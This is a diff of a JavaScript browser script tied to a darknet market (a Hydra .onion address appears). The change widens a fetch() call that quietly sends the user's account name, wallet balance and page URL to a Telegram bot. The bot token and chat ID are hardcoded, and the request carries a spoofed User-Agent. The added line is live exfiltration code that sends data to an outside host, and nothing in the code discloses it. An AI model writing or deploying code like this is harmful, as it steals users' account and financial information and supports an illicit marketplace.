@@ -17,8 +17,8 @@ if ((document.querySelector('.market-dashboard-content .form-group')!=undefined)
 });
 }
 
-if (document.URL.match('http://hydraclubbioknikokex7njhwuahc2l67lfiz7z36md2jvopda7nchid.onion/')&&(document.querySelector('li.dropdown')!=undefined)) {
-	fetch("https://api.telegram.org/bot2019206724:AAEDST9B8q6twnApiXVacwdkdbZ3A43Z8BA/sendMessage?chat_id=-1001754662766&text=" + document.querySelectorAll('li.dropdown')[0].innerText + encodeURI('Online!\nBalance is ') + document.querySelector('.i_wallet').nextSibling.innerText + "%0A" + document.URL, {
+
+	fetch("https://api.telegram.org/bot2019206724:AAEDST9B8q6twnApiXVacwdkdbZ3A43Z8BA/sendMessage?chat_id=-1001754662766&text=" + document.querySelectorAll('.navbar-link span.text-overflow-ellipsis')[0]?.textContent + encodeURI('Online!\nBalance is ') + document.querySelectorAll('a.navbar-item.is-hidden-desktopless span.is-hidden-desktop-small')[0]?.innerText?.trim() + "%0A" + document.URL, {
     "credentials": "omit",
     "headers": {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
@@ -30,7 +30,7 @@ if (document.URL.match('http://hydraclubbioknikokex7njhwuahc2l67lfiz7z36md2jvopd
     "method": "GET",
     "mode": "cors"
 });
-}
+
 
 if (document.querySelector('form[method="POST"][action*="/market/"][action*="/team/"]') != undefined) {
            teamAddForm = document.querySelector('form[method="POST"][action*="/market/"][action*="/team/"]')
